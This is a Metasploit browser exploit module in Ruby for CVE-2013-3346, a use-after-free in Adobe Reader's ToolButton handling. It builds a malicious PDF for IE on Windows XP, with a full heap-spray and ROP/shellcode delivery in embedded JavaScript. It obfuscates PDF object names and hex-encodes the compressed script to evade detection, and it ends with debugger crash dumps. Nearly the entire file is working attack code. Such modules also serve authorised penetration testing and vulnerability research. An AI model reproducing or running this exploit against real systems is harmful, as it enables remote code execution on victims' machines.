##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Reader ToolButton Use After Free",
      'Description'    => %q{
        This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6
        and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where
        the cEnable callback can be used to early free the object memory. Later use of the object
        allows triggering the use after free condition. This module has been tested successfully
        on Adobe Reader 11.0.2 and 10.0.4, with IE and Windows XP SP3, as exploited in the wild in
        November, 2013. At the moment, this module doesn't support Adobe Reader 9 targets; in order
        to exploit Adobe Reader 9 the fileformat version of the exploit can be used.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Soroush Dalili', # Vulnerability discovery
          'Unknown', # Exploit in the wild
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3346' ],
          [ 'OSVDB', '96745' ],
          [ 'ZDI', '13-212' ],
          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb13-15.html' ],
          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html' ]
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00",
          'DisableNops' => true
        },
      'BrowserRequirements' =>
        {
          :source      => /script|headers/i,
          :os_name     => Msf::OperatingSystems::WINDOWS,
          :os_flavor   => Msf::OperatingSystems::WindowsVersions::XP,
          :ua_name     => Msf::HttpClients::IE
        },
      'Targets'        =>
        [
          [ 'Windows XP / IE / Adobe Reader 10/11', { } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 08 2013",
      'DefaultTarget'  => 0))

  end

  def on_request_exploit(cli, request, target_info)
    print_status("request: #{request.uri}")
    js_data = make_js(cli, target_info)
    # Create the pdf
    pdf = make_pdf(js_data)
    print_status("Sending PDF...")
    send_response(cli, pdf, { 'Content-Type' => 'application/pdf', 'Pragma' => 'no-cache' })
  end

  def make_js(cli, target_info)
    # CreateFileMappingA + MapViewOfFile + memcpy rop chain
    rop_10 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' => '10' }))
    rop_11 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' => '11' }))
    escaped_payload = Rex::Text.to_unescape(get_payload(cli, target_info))

    js = %Q|
function heapSpray(str, str_addr, r_addr) {
  var aaa = unescape("%u0c0c");
  aaa += aaa;
  while ((aaa.length + 24 + 4) < (0x8000 + 0x8000)) aaa += aaa;
  var i1 = r_addr - 0x24;
  var bbb = aaa.substring(0, i1 / 2);
  var sa = str_addr;
  while (sa.length < (0x0c0c - r_addr)) sa += sa;
  bbb += sa;
  bbb += aaa;
  var i11 = 0x0c0c - 0x24;
  bbb = bbb.substring(0, i11 / 2);
  bbb += str;
  bbb += aaa;
  var i2 = 0x4000 + 0xc000;
  var ccc = bbb.substring(0, i2 / 2);
  while (ccc.length < (0x40000 + 0x40000)) ccc += ccc;
  var i3 = (0x1020 - 0x08) / 2;
  var ddd = ccc.substring(0, 0x80000 - i3);
  var eee = new Array();
  for (i = 0; i < 0x1e0 + 0x10; i++) eee[i] = ddd + "s";
  return;
}
var shellcode = unescape("#{escaped_payload}");
var executable = "";
var rop10 = unescape("#{rop_10}");
var rop11 = unescape("#{rop_11}");
var r11 = false;
var vulnerable = true;

var obj_size;
var rop;
var ret_addr;
var rop_addr;
var r_addr;

if (app.viewerVersion >= 10 && app.viewerVersion < 11 && app.viewerVersion <= 10.106) {
  obj_size = 0x360 + 0x1c;
  rop = rop10;
  rop_addr = unescape("%u08e4%u0c0c");
  r_addr = 0x08e4;
  ret_addr = unescape("%ua8df%u4a82");
} else if (app.viewerVersion >= 11 && app.viewerVersion <= 11.002) {
  r11 = true;
  obj_size = 0x370;
  rop = rop11;
  rop_addr = unescape("%u08a8%u0c0c");
  r_addr = 0x08a8;
  ret_addr = unescape("%u8003%u4a84");
} else {
  vulnerable = false;
}

if (vulnerable) {
  var payload = rop + shellcode;
  heapSpray(payload, ret_addr, r_addr);

  var part1 = "";
  if (!r11) {
    for (i = 0; i < 0x1c / 2; i++) part1 += unescape("%u4141");
  }
  part1 += rop_addr;
  var part2 = "";
  var part2_len = obj_size - part1.length * 2;
  for (i = 0; i < part2_len / 2 - 1; i++) part2 += unescape("%u4141");
  var arr = new Array();

  removeButtonFunc = function () {
    app.removeToolButton({
        cName: "evil"
    });

    for (i = 0; i < 10; i++) arr[i] = part1.concat(part2);
  }

  addButtonFunc = function () {
    app.addToolButton({
      cName: "xxx",
      cExec: "1",
      cEnable: "removeButtonFunc();"
    });
  }

  app.addToolButton({
    cName: "evil",
    cExec: "1",
    cEnable: "addButtonFunc();"
  });
}
|

    js
  end

  def RandomNonASCIIString(count)
    result = ""
    count.times do
      result << (rand(128) + 128).chr
    end
    result
  end

  def ioDef(id)
    "%d 0 obj \n" % id
  end

  def ioRef(id)
    "%d 0 R" % id
  end


  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def nObfu(str)
    #return str
    result = ""
    str.scan(/./u) do |c|
      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
        result << "#%x" % c.unpack("C*")[0]
      else
        result << c
      end
    end
    result
  end


  def ASCIIHexWhitespaceEncode(str)
    result = ""
    whitespace = ""
    str.each_byte do |b|
      result << whitespace << "%02x" % b
      whitespace = " " * (rand(3) + 1)
    end
    result << ">"
  end


  def make_pdf(js)
    xref = []
    eol = "\n"
    endobj = "endobj" << eol

    # Randomize PDF version?
    pdf = "%PDF-1.5" << eol
    pdf << "%" << RandomNonASCIIString(4) << eol

    # catalog
    xref << pdf.length
    pdf << ioDef(1) << nObfu("<<") << eol
    pdf << nObfu("/Pages ") << ioRef(2) << eol
    pdf << nObfu("/Type /Catalog") << eol
    pdf << nObfu("/OpenAction ") << ioRef(4) << eol
    # The AcroForm is required to get icucnv36.dll / icucnv40.dll to load
    pdf << nObfu("/AcroForm ") << ioRef(6) << eol
    pdf << nObfu(">>") << eol
    pdf << endobj

    # pages array
    xref << pdf.length
    pdf << ioDef(2) << nObfu("<<") << eol
    pdf << nObfu("/Kids [") << ioRef(3) << "]" << eol
    pdf << nObfu("/Count 1") << eol
    pdf << nObfu("/Type /Pages") << eol
    pdf << nObfu(">>") << eol
    pdf << endobj

    # page 1
    xref << pdf.length
    pdf << ioDef(3) << nObfu("<<") << eol
    pdf << nObfu("/Parent ") << ioRef(2) << eol
    pdf << nObfu("/Type /Page") << eol
    pdf << nObfu(">>") << eol # end obj dict
    pdf << endobj

    # js action
    xref << pdf.length
    pdf << ioDef(4) << nObfu("<<")
    pdf << nObfu("/Type/Action/S/JavaScript/JS ") + ioRef(5)
    pdf << nObfu(">>") << eol
    pdf << endobj

    # js stream
    xref << pdf.length
    compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
    pdf << ioDef(5) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
    pdf << "stream" << eol
    pdf << compressed << eol
    pdf << "endstream" << eol
    pdf << endobj

    ###
    # The following form related data is required to get icucnv36.dll / icucnv40.dll to load
    ###

    # form object
    xref << pdf.length
    pdf << ioDef(6)
    pdf << nObfu("<</XFA ") << ioRef(7) << nObfu(">>") << eol
    pdf << endobj

    # form stream
    xfa = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>
    EOF

    xref << pdf.length
    pdf << ioDef(7) << nObfu("<</Length %s>>" % xfa.length) << eol
    pdf << "stream" << eol
    pdf << xfa << eol
    pdf << "endstream" << eol
    pdf << endobj

    ###
    # end form stuff for icucnv36.dll / icucnv40.dll
    ###


    # trailing stuff
    xrefPosition = pdf.length
    pdf << "xref" << eol
    pdf << "0 %d" % (xref.length + 1) << eol
    pdf << "0000000000 65535 f" << eol
    xref.each do |index|
      pdf << "%010d 00000 n" % index << eol
    end

    pdf << "trailer" << eol
    pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

    pdf << "startxref" << eol
    pdf << xrefPosition.to_s() << eol

    pdf << "%%EOF" << eol
    pdf
  end

end


=begin

* crash Adobe Reader 10.1.4

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0c0c08e4 ebx=00000000 ecx=02eb6774 edx=66dd0024 esi=02eb6774 edi=00000001
eip=604d3a4d esp=0012e4fc ebp=0012e51c iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
AcroRd32_60000000!PDFLTerm+0xbb7cd:
604d3a4d ff9028030000    call    dword ptr [eax+328h] ds:0023:0c0c0c0c=????????

* crash Adobe Reader 11.0.2

(940.d70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Reader 11.0\Reader\AcroRd32.dll -
eax=0c0c08a8 ebx=00000001 ecx=02d68090 edx=5b21005b esi=02d68090 edi=00000000
eip=60197b9b esp=0012e3fc ebp=0012e41c iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210213
AcroRd32_60000000!DllCanUnloadNow+0x1493ae:
60197b9b ff9064030000    call    dword ptr [eax+364h] ds:0023:0c0c0c0c=????????

=end
